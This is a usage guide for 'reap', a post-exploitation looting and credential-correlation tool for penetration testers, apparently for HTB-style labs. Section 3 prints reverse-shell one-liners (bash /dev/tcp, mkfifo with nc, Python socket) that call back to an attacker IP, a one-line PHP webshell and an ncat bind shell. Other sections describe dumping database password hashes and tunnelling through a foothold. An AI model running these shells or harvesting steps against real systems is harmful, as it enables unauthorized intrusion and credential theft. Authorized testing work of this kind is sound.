# reap — Usage Guide

## What reap is (and isn't)

reap runs **after** you already have access to a target. **You** get the foothold
(exploit, creds, RCE, a caught shell). reap then connects to that access and does the
boring part: harvests loot (secrets, configs, keys, env), tests discovered credentials
against discovered services, and gives you a ranked findings list + report.

> reap does **not** exploit anything or get the shell for you. You bring a working
> exec channel; reap loots and correlates over it.

---

Connecting a shell from another tool? Use the [agent quickstart](AGENT_QUICKSTART.md).

## 1. Install (once per Kali)

Reap requires Python 3.9 or newer. On Kali, install Git and Python's venv support:

```bash
sudo apt install -y git python3-venv
```

Get the project onto the box using `git clone` or the source archive instructions below, then:

```bash
cd ~/reap                    # the project folder
bash install.sh --full       # local .venv + all optional backends
# or, for a command that needs no activation:
bash install.sh --pipx --full   # editable reap on your user's PATH (needs pipx)
```

For the `.venv` install, use it from each new terminal with:

```bash
source ~/reap/.venv/bin/activate && reap
```

Notes:

- `--pipx` needs pipx first: `sudo apt install -y pipx && pipx ensurepath` (then a new shell).
- Choose one backend flag: `--db`, `--win` or `--full`. Use `--full` for both sets; if you pass several backend flags, the last one wins.
- Behind a TLS-intercepting proxy, add `--trusted-host`.
- `bash install.sh --help` lists all flags (`--db`, `--win`, `--full`, `--pipx`, `--with-pwncat`, `--trusted-host`).
- Prefer not to activate a `.venv`? `alias reap='~/reap/.venv/bin/reap'` in `~/.bashrc`.

Both installation modes are editable. Keep the source folder at its installed path; moving or deleting it can break Reap. If you move the source, rerun the pipx installer from the new location. A local `.venv` moved with the source must be recreated: move it out of the way and rerun `bash install.sh --full`, since its launchers contain absolute paths. `--pipx` exposes the command for the current Linux user, and `--full` installs the optional backends. Neither flag installs Reap for every account on Kali.

### Transfer Reap to another Kali instance

For the one-file agent, use a prepared build that includes the ready-to-use target files. A Git source archive or bundle transfers source code and is useful for development, but does not include untracked target executables. All installation methods still need Python dependency downloads on Kali.

#### Install a prepared build with the agent

Copy the prepared `reap-1.13.0.tar.gz` archive supplied with this build to Kali. On a fresh installation, after installing pipx as described above:

```bash
mkdir ~/reap
tar -xzf /path/to/reap-1.13.0.tar.gz --strip-components=1 -C ~/reap
cd ~/reap
bash install.sh --pipx --full
reap
```

Use a new directory. For an existing installation, follow the backup instructions below before applying an update. You do not install Go or build the target agent yourself.

Once Reap opens, follow the [agent quickstart](AGENT_QUICKSTART.md).

#### Create a source-only archive

From the source repository on Windows or Linux:

```bash
git status --short
git archive --format=tar.gz --prefix=reap/ --output=../reap-source.tar.gz HEAD
```

`HEAD` means the latest local commit. The archive excludes `.git`, uncommitted edits and untracked files. Review the status output and commit the source changes you intend to distribute first. `git ls-files` shows the tracked files that will be packaged; ignored files that were already committed remain tracked.

Transfer the archive by scp, USB or a shared folder. On a fresh Kali machine, after installing pipx as described above:

```bash
tar -xzf /path/to/reap-source.tar.gz -C "$HOME"
cd ~/reap
bash install.sh --pipx --full
reap --help
```

This creates `~/reap` as the permanent source directory. An archive has no Git metadata, so `git pull` is unavailable there. To update it later, transfer a newer archive, review local edits and apply the new source after a backup, then rerun the installer. Use a separate extraction directory for an existing installation so you can compare files before replacing them.

#### Carry Git history with a bundle

From the source repository:

```bash
git bundle create ../reap.bundle main
git bundle verify ../reap.bundle
```

This includes `main` and its committed history. It does not include other branch tips, uncommitted edits, ignored engagement files or the source repository's configuration and hooks. Copy the bundle to Kali, then clone it into a directory that does not already exist:

```bash
git clone -b main /path/to/reap.bundle ~/reap
cd ~/reap
bash install.sh --pipx --full
reap --help
```

The clone's `origin` initially points to the bundle file. To use GitHub for future updates when it is accessible:

```bash
git remote set-url origin https://github.com/Cobrastrike62/reap.git
```

You can also copy a standalone checkout including its hidden `.git` directory when you want its local Git setup. Do not use that approach for a linked Git worktree: its `.git` file can point back to the original machine. A bundle avoids that dependency. Git history can contain files deleted from the current source, so review the history before sharing a bundle outside your own machines.

#### Update an existing Kali or Kali WSL installation

First back up the existing checkout, including local edits and engagement data. For example, this makes a private backup on the same Kali instance:

```bash
backup_dir="$HOME/reap-backups/$(date +%Y%m%d-%H%M%S)"
mkdir -p "$backup_dir"
chmod 700 "$HOME/reap-backups" "$backup_dir"
cp -a "$HOME/reap" "$backup_dir/reap"
```

The backup can contain credentials and agent private keys; keep it private. Preserve existing loot databases and generated kits separately from source updates. Do not replace `.git` or delete untracked files to force an update through.

For a GitHub checkout with no conflicting local changes:

```bash
cd ~/reap
git status --short
git pull --ff-only
bash install.sh --pipx --full
reap --help
```

For local-venv installations, use `bash install.sh --full` and `source ~/reap/.venv/bin/activate` instead. Source edits load when Reap restarts; new dependencies require the installer. Existing loot databases are migrated when Reap opens them. Reap's relative default database path, `reap.db`, is resolved from the directory where you start the command, so use `reap --db /path/to/engagement.db` to reopen the intended store.

If an older alias, shell function or activated venv masks a pipx command, inspect it with `type -a reap`. Deactivate the old venv and adjust the alias if you intend to use pipx. Do not transfer `.venv`, pipx environments, caches or build output between machines; reinstall for the destination's Python version. A fully offline install also needs dependency wheels compatible with that Python version and architecture. The source archive and Git bundle do not contain those wheels.

These steps install Reap on Kali. The [one-file agent](AGENT_QUICKSTART.md) uses ready-to-use target executables included in a packaged Reap build. A Git source archive does not include untracked executables. For agent use on another Kali machine, transfer a packaged build that includes them; [developer packaging notes](native-agent/README.md) explain how maintainers prepare it. On the target, copy and run only the generated agent file.

References: [Git source archives](https://git-scm.com/docs/git-archive), [Git bundles](https://git-scm.com/docs/git-bundle), [pipx installation options](https://pipx.pypa.io/stable/reference/cli.html).

---

## 2. Start it

```bash
reap                      # interactive console
reap --db engagement.db   # use a named loot DB that persists across hosts/hops
```

---

## 3. Tell reap how you got in  ← the part that matters

reap works over a **session**. Register the one that matches **the access you already
have** (`register` auto-fingerprints OS / privilege / runtimes afterwards):

| What your foothold is | Register it with |
|---|---|
| SSH password | `register ssh <ip> <user> <password>` |
| SSH private key | `register ssh <ip> <user> --key /path/key [--port 22]` |
| Windows + WinRM creds | `register winrm <ip> <user> <password> [--ssl] [--port 5985]` |
| **Web shell** (HTTP RCE: a page that runs a command parameter) | `register webshell <url> [--param cmd] [--method POST]` |
| Raw reverse shell (nc) | `register listen <port>` then fire your payload |
| Raw bind shell | `register bind <host> <port>` |
| Shell from another tool | `agent`, copy the generated file, then `agent listen` |

### "My shell isn't SSH" — read this

reap needs a channel it can **send a command to and read the output back from**.
Match your situation:

- **You have web / command-injection RCE** (you can hit a URL that runs commands) →
  use the **`webshell`** adapter — this is exactly the webshell-RCE pattern reap is built
  for. Drop a tiny webshell into a web-served directory, then register the URL:
  ```bash
  # via your RCE, write to the web root, e.g.:  <?php system($_REQUEST["cmd"]); ?>
  reap> register webshell http://target/uploads/sh.php
  # --param NAME if it reads a different parameter; --method GET if it's a GET shell
  ```

- **You caught (or will catch) a raw reverse/bind shell** → reap drives it directly, no
  `nc` in between. See "Raw reverse & bind shells" below for the full walkthrough.

- **A shell from another tool, including Windows** → use `agent` to make one file for the target. Copy it, run `agent listen` in Reap, then run that file in the target shell. See the [agent walkthrough](#connect-a-shell-from-another-tool-with-one-file).

> **Rule of thumb:** web RCE → `webshell`; SSH/WinRM creds → `ssh`/`winrm`; a caught
> reverse or bind shell → `listen`/`bind`. reap meets you at a *stable exec channel*.

### Raw reverse & bind shells

reap can be the catcher itself — no `nc` in between. It wraps every command with a random
sentinel and reads the socket until the sentinel returns, so it recovers each command's
output and a real exit code over the bare shell.

**Reverse shell** (the target connects back to you). Start the listener **first**, then fire
your payload:

```text
reap> register listen 4444
  listening on 0.0.0.0:4444 — fire your reverse shell now...
```

Now trigger the reverse shell through whatever RCE you have. `10.10.14.5` is *your*
attacking/VPN IP and `4444` is the port you're listening on:

```bash
# Linux, bash /dev/tcp:
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Linux, no /dev/tcp (fifo + nc):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# Python:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

The moment it connects, reap registers the session, auto-fingerprints it, and you `run`
exactly like any other adapter.

**Bind shell** (you dial in to a port the target is listening on):

```bash
# on the target, via your RCE — or the exploit opens the port itself:
ncat -lvp 1337 -e /bin/bash
```
```text
reap> register bind 10.10.10.5 1337
```

**Windows** `cmd.exe` shells (reverse or bind) — add `--shell cmd`, e.g.
`register listen 4444 --shell cmd`.

**Limits.** There is no PTY, so interactive prompts (a `sudo` password, `vi`, `top`) won't
work — reap only sends commands that return, which is exactly what the collection modules
do, so looting is unaffected. For a long or flaky engagement, SSH is the sturdier channel:
stabilize in **pwncat-vl**, drop your key, then `register ssh`.

---

### Connect a shell from another tool with one file

The agent connects an existing target shell to Reap. It runs as the account you already have. You do not install Go or Python on the target, and you do not copy separate password or certificate files.

The [agent quickstart](AGENT_QUICKSTART.md) is a short walkthrough you can keep beside your terminal.

**1. On Kali, make the agent.** Open Reap:

```bash
reap
```

At the `reap>` prompt:

```text
agent
```

Enter the IP address the target can use to reach Kali. In an HTB or similar VPN lab, this is usually your VPN address. For example, if Kali's VPN IP is `10.10.14.2`, enter `10.10.14.2`. Do not enter the target's IP.

Choose the target type when asked. Choose Linux PC for a typical Linux VM, Linux ARM for an ARM machine, or Windows PC for Windows. Reap shows the file it created and the next commands.

**2. Copy the one generated file to the target.** Use your existing shell or file transfer tool. The Linux file is named `reap-agent`; the Windows file is `reap-agent.exe`. Keep the filename when copying so the printed commands work as written.

**3. On Kali, start the listener.** This tells Reap to wait for that file to connect:

```text
agent listen
```

**4. In the target shell, run the file.** For Linux, change to the directory where you copied it, then run:

```bash
chmod +x reap-agent
./reap-agent
```

For Windows, run this in PowerShell in the directory where you copied the file:

```powershell
.\reap-agent.exe
```

Leave the agent running. When Reap reports a connection, continue in Reap:

```text
enum
run
```

`enum` shows what is on the target. `run` collects loot and checks discovered credentials. `!whoami` runs a command on the connected target. Linux agents also support `ports --probe` to identify services on ports already discovered there; Windows service identification is not supported.

Use `exit` at the `reap>` prompt to close Reap and its agent connection. Ctrl-C in the target shell also stops the agent. Delete the copied executable from the target when finished. It runs in the foreground and does not install a service or start itself after a reboot.

### Agent options and saved setups

Once you know your reachable IP, skip the questions:

```text
agent create 10.10.14.2
```

This creates a Linux PC agent named `reap-agent` in the directory where you started Reap. Reap will not replace an existing file. Reuse it with `agent listen`, or choose another filename with `--output` for a new setup.

To choose a different kind of target:

```text
agent create 10.10.14.2 --target windows
agent create 10.10.14.2 --target linux-arm64
```

Use `--output` to choose the generated file's path, or `--port` if you need a different listening port:

```text
agent create 10.10.14.2 --output /tmp/lab-agent
agent create 10.10.14.2 --port 8443
```

Run the filename you actually copied. For the first example, that would be `chmod +x lab-agent` and `./lab-agent` on Linux. You do not add connection flags when running it; Reap has already put the correct settings inside the file.

Reap keeps each setup on Kali under `~/.local/share/reap/agents`. A setup contains the private connection settings and is separate from the loot database. Leave it on Kali. Each new agent gets its own saved setup.

| Command in Reap | What it does |
|---|---|
| `agent list` | show saved setups and their names |
| `agent show` | show the latest setup's file and instructions |
| `agent show NAME` | show instructions for a particular saved setup |
| `agent listen` | wait for the latest setup to connect |
| `agent listen NAME` | wait for a particular saved setup to connect |
| `agent help` | show agent command help |

Replace `NAME` with a name from `agent list`. Reopening Reap does not forget these setups. Keep using the setup that matches the file you copied, especially after creating more than one agent.

### If the agent will not connect

- **Reap says ready-to-run files are missing:** this installation contains source only. Install the [prepared build](#install-a-prepared-build-with-the-agent), which includes the target files.
- **Reap stopped waiting:** the listener waits for 60 seconds. Run `agent listen` again, then run the target file. You can reuse the same file.
- **The target says connection refused:** start `agent listen` on Kali first. Check that your chosen port is reachable.
- **The connection times out:** check that the IP entered during setup is reachable from the target. In a VPN lab, use Kali's VPN IP. If you entered the wrong IP or port, create and copy a new agent.
- **Linux says `Permission denied`:** run `chmod +x reap-agent`. If it still fails, move the file to a directory where execution is allowed.
- **Linux says `Exec format error`:** you probably selected the wrong target type. Run `uname -m` in the target shell. `x86_64` means Linux PC; `aarch64` means Linux ARM. Create a new file for that type and copy it again.
- **Reap says the agent file already exists:** use `agent show` to reuse it, or add `--output new-agent` when making a new setup.
- **You created several agents:** use `agent list`, then `agent show NAME` and `agent listen NAME` for the setup matching the copied file.

The agent needs a working shell on the target: `/bin/sh` on Linux or `cmd.exe` on Windows. It runs one command at a time and is suitable for commands that finish and return output. Terminal programs such as `vi` and interactive password prompts need a full terminal instead.

### Advanced agent connections

The older `agent prepare`, `register agent-listen`, and `register agent` commands remain available for manual Python agents and target-side listeners. They require more setup. Use the [developer and manual connection notes](native-agent/README.md) when you specifically need those modes.

## 4. The workflow (identical for every adapter)

```text
reap> register <...>      # 1. attach to your foothold (auto-fingerprints)
reap> run                 # 2. fire matched loot modules, then auto-correlate
reap> creds               # 3a. recovered credentials + which services they unlocked
reap> findings            # 3b. ranked loot (high-severity / capabilities on top)
reap> report loot.md      # 4. write timeline + ranked findings to markdown
```

Found a credential that works on another box? `register` that host too — the loot DB
persists, so correlation spans every hop and gets smarter as you go deeper.

---

## 5. Look around — survey the box and run commands on it

Two things you want the moment you land on a box, without leaving reap.

### `enum` — linpeas-style situational awareness

`enum` surveys the active session and prints it to the screen:

- **processes** — full `ps`, so you can eyeball creds on command lines and
  root-owned processes running out of writable paths;
- **cron / scheduled jobs** — `/etc/crontab`, `cron.d`, the periodic run-parts
  dirs, per-user crontabs, the spool, and `systemd` timers;
- **services** — running + enabled-at-boot systemd units, and the SysV fallback;
- **privilege escalation** — `sudo -l` NOPASSWD, non-standard SUID (GTFOBins),
  dangerous file capabilities, writable cron files;
- **files & permissions** — writable `$PATH` dirs, **root-owned files you can
  write, that are group-writable in a group you're in, or that sit in a directory
  you can write**, readable SSH private keys, world-writable, files you own;
- **system & network** — kernel / distro / sudo version, `PATH`, users,
  **dangerous group membership (docker/lxd/disk/shadow/…) + container / writable
  docker.sock**, interfaces, routes, **listening sockets**, connections, ARP, DNS;
- **Windows** — services (logon account + binary path), scheduled tasks, and
  processes with full command lines.

Every section leads with a **⚑ worth a look** block — the items reap judges *out
of place*, each with a one-line reason — then the full raw listing (dimmed).
`enum` ends with a **summary** of everything flagged across all sections, split
into *worth acting on* (red) and *worth a look* (yellow), so you get a punch-list
instead of a wall of text. The main heuristic: anything running from / referencing
a path **outside the base system** (`/opt`, `/home`, `/srv`, `/usr/local`, `/tmp`
…) — plus root-owned things you can influence (writable, group-writable in your
group, or in a dir you can write), a fast path via your groups (docker/lxd/disk/
shadow/sudo) or a writable docker socket, `sudo -l`/SUID/capabilities, secrets on
command lines, operator tools, vulnerable `sudo`, the kernel (with a `searchsploit`
pointer), extra UID-0 accounts, readable SSH keys, and loopback/exposed services.
Ordinary `enum` is screen-only. Add `--save` to retain the complete returned survey and coverage in a separate snapshot table; ranked `findings` are populated by `run`.

```text
reap> enum                 # full survey (flags + raw + summary)
reap> enum cron            # filter to the cron module
reap> enum proc            # filter to processes
reap> enum interesting     # just files & permissions
```

The **actionable** subset is still captured as ranked findings by `run` (so you
don't enumerate twice): a secret on a process/cron/service command line becomes a
credential; a **writable** service binary, unit file, cron target, `$PATH`
directory, or a root-owned file you can write (outright, via your group, or via a
writable parent dir) becomes a high-severity misconfig; an unquoted Windows service
path a medium. `enum` reads the room; `run` loots it.

The files-and-permissions sweep is **scoped and fast** by default (curated roots
+ `$PATH`, pseudo-filesystems pruned) and is skipped entirely when you're already
root. Set `REAP_ENUM_FULLFS=1` to sweep the whole filesystem like linpeas — slower
and noisier, so think twice over a raw shell or webshell.

### Saved enumeration, coverage and connected evidence

```text
reap> enum linked                 # cron/service paths joined to effective permissions
reap> enum --brief                # leads and coverage without raw listings
reap> enum --save                 # save the complete returned survey
reap> enum --diff                 # compare with this host's saved baseline
reap> enum --probe --diff --save   # identify services, compare, then save
reap> show E1                     # latest enum lead, with full evidence
reap> show snapshot 1             # saved survey and check status
reap> show 12                     # full stored finding details
```

Connected leads show execution source, run-as account, owner/group/mode, effective file or parent access, confidence and a next check. They check at most 60 parsed absolute-path references and do not establish whether the scheduled job or service is active. A root-owned file shared through your group is useful when your session can influence something a more privileged account consumes.

Coverage distinguishes completed checks, missing tools, permission failures, partial output, timeouts and reached caps. Missing results from a failed check do not prove absence. Version hints are inferred and require checking distro fixes.

A saved baseline is specific to the host and selected filter; `--probe` also changes scope. `--brief` changes only the display. `--diff` alone does not save; `--diff --save` compares before storing the next baseline. Process IDs and printed timestamps can produce ordinary differences. Snapshot IDs survive restarts; `E1` refers to the latest enum in this console. [README: evidence and coverage](README.md#evidence-coverage-and-saved-enumeration-v111) gives more detail.

### `ports` — local sockets and optional identification

```text
reap> ports
```

`ports` combines IPv4/IPv6 ss, netstat and procfs socket tables, preserving separate bind addresses, families, transports, processes and PIDs when available. It sees the session's network namespace. Restricted or missing sources appear in coverage. Reach loopback TCP ports with `forward 127.0.0.1 <port>` or `forward ::1 <port>` as displayed. UDP sockets are excluded from TCP correlation and auto-forwarding.

`ports --probe` and `enum --probe` use negotiated native probing for Linux native-agent sessions and target Python for other Linux sessions. They select 12 discovered TCP listeners by default (hard ceiling 24). Evidence includes HTTP status/title/server/redirect, banners, TLS version and certificate fingerprint. Native reads share 64 KiB per endpoint across attempts; the Python fallback caps each response at 64 KiB. Both have a 55-second overall budget. Redirects are recorded without following them; additional ports are not scanned. TLS metadata does not verify service identity. Failed requests and caps remain visible. Windows probing remains unsupported.

### `!<cmd>` and `interact` — a shell on the target

You're shelled into the box; sometimes you just want to `ls` and `cd` around.

- **`!<cmd>`** (alias `shell <cmd>`) runs one command on the active session and
  prints the output: `!id`, `!ls -la /root`, `!cat /etc/passwd`.
- **`interact`** drops you into a remote prompt — type commands normally until you
  `exit` (or hit Ctrl-D):
  ```text
  reap> interact
  10.10.10.5:~$ cd /var/www
  10.10.10.5:/var/www$ ls
  index.php  config.php
  10.10.10.5:/var/www$ exit
  reap>
  ```

`cd` persists across commands on **every** transport — reap tracks a virtual
working directory (an SSH `exec` is otherwise a fresh shell each call, so a naive
`cd` would be forgotten). Same limit as the raw-shell adapter: line-based, **no
PTY**, so `top` / `vi` / an interactive `sudo` prompt won't work — stabilize in
pwncat-vl for those.

---

## 6. Command reference

| command | what it does |
|---|---|
| `register <adapter> …` | attach to a foothold (ssh / winrm / webshell / bind / listen / handoff) |
| `sessions` / `use <id>` | list registered sessions / switch the active one |
| `hosts` | list discovered hosts (persist in the loot DB) |
| `fingerprint` | re-probe the active session (OS, priv, runtimes) |
| `run` | collect loot from the active session, then correlate |
| `enum [filter] [--save] [--diff] [--probe] [--brief]` | survey, evidence, coverage and optional saved comparisons |
| `ports` | every local listening socket, unioned from ss + netstat + `/proc/net` (found even with no ss/netstat); flags loopback-only |
| `!<cmd>` / `shell <cmd>` | run one command on the target (virtual `cd` persists across commands) |
| `interact` | drop into a line-based remote shell on the target (`exit`/Ctrl-D to leave) |
| `correlate` | re-test discovered creds against discovered services; on a confirmed DB login, dump its credential catalog (mysql.user / pg_shadow / sql_logins / mongo) to loot |
| `forward <rhost> <rport> [lport]` | tunnel a target-internal service to `127.0.0.1` via the active SSH session (like `ssh -L`) |
| `forwards` / `unforward <lport>` | list / tear down active port forwards |
| `creds` | credentials and their verified reuse |
| `findings` (alias `loot`) | ranked findings list |
| `search <regex>` | search findings by title / detail / note |
| `note <id> <text>` | annotate a finding (shows in the report) |
| `report [file.md] [redact]` | timeline + ranked findings to markdown (`redact` masks secrets) |
| `export <creds\|hashes\|targets\|json> [path]` | password-only lists, per-mode hashes, targets, or JSON |
| `show <id\|E1>` / `show snapshot <id>` | full finding, latest enum lead, or saved survey |
| `agent` | guided setup: make one file to copy to the target |
| `agent create <your-IP> [--target linux\|linux-arm64\|windows] [--output PATH] [--port N]` | make a target file without the setup questions |
| `agent listen [NAME]` | wait for the latest agent, or choose a saved setup |
| `agent list` / `agent show [NAME]` | list saved setups / show copy-and-run instructions |
| `import <nmap.xml>` | seed services from an nmap scan |
| `modules` | which modules match the active context |
| `help` / `exit` | help / quit |

---

## 7. Reaching internal / loopback-only services (port forwarding)

Services bound to a target's `127.0.0.1` (a DB, an admin panel, a second SSH) aren't
reachable from your Kali — but reap can tunnel to them over the session it already holds.
Over an **SSH** session it's in-process (paramiko `direct-tcpip`, like `ssh -L` with no
second terminal). Over a **raw reverse/bind shell** it stands up a **chisel reverse
tunnel** instead — the target dials back out to you (firewall-friendly), which needs a
`chisel` binary on your Kali (`REAP_CHISEL` or on `PATH`) and `wget`/`curl` on the target.
Either way the forwarded local endpoint is registered so `correlate` reaches it.

**Automatic.** On `run`, reap auto-forwards any loopback-bound DB/SSH/etc. it discovers
and registers the local end so `correlate` reaches it:

```text
reap> register ssh 10.10.10.5 haris --key ~/.ssh/id_rsa
reap> run
  ...
  auto-forward 127.0.0.1:24306 → 10.10.10.5 loopback mysql/3306
reap> correlate
  REUSE  /var/www/app/config.php -> svc_db@127.0.0.1:24306 (mysql)   # looted DB pass works
```
(Disable with `export REAP_NO_AUTOFORWARD=1`.)

**Manual.** Forward anything reachable from the foothold — including a *different* internal
host — then point an adapter or `correlate` at `127.0.0.1:<local_port>`:

```text
reap> forward 127.0.0.1 1337            # the foothold's own loopback :1337
  forward up 127.0.0.1:24137 → 127.0.0.1:1337 (via ssh:haris@10.10.10.5:22)
reap> forward 10.10.20.50 22 2222       # a second box only reachable from the foothold
reap> register ssh 127.0.0.1 arthur 'pw' --port 2222   # loot box two through the pivot
reap> forwards                          # list them;  unforward 2222  closes one
```

Because the loot store persists across hops, creds found on the foothold are correlated
against the forwarded/internal services automatically.

---

## 8. Tips

- **Headless / scripted** (or when a webshell sweep is slow): use the driver instead of
  the REPL —
  ```bash
  python reap_run.py 'webshell:http://target/sh.php' engagement.db
  python reap_run.py 'ssh:user:pass@10.10.10.5' engagement.db
  python reap_run.py 'ssh-key:user@10.10.10.5:/path/key' engagement.db
  ```
- **Webshell channel is slow for broad sweeps** (PHP per-request time limits). Over SSH
  it's fast. For webshell, prefer `reap_run.py` (or just let `run` finish).
- **Editing Reap's source needs no reinstall**: restart Reap to load the changed code.
  Rerun the installer when dependencies change, and keep its source directory in place.
- **DB credential-catalog dump**: when `correlate` confirms a DB login, reap reuses
  it to read the database's own account hashes (`mysql.user`, `pg_shadow`,
  `sys.sql_logins`, mongo `system.users`) into loot — tagged with the hashcat mode,
  so `export hashes` writes supported per-mode files and a manifest for manual cracking. Needs the DB backend installed
  (`install.sh --db`/`--full`) and enough privilege to read the catalog. It reads
  only the auth catalog, never app tables; disable with `REAP_NO_DBDUMP=1`.
- **Heavy enum wrappers** (LinPEAS/WinPEAS/SharpHound) only fire if you opt in with
  `export REAP_HEAVY=1` and the tools are on disk. The built-in **`enum`** command is
  the no-drop alternative — it surveys the box natively (no binary to upload or hide),
  and `run` already captures the privesc-relevant findings it would surface.
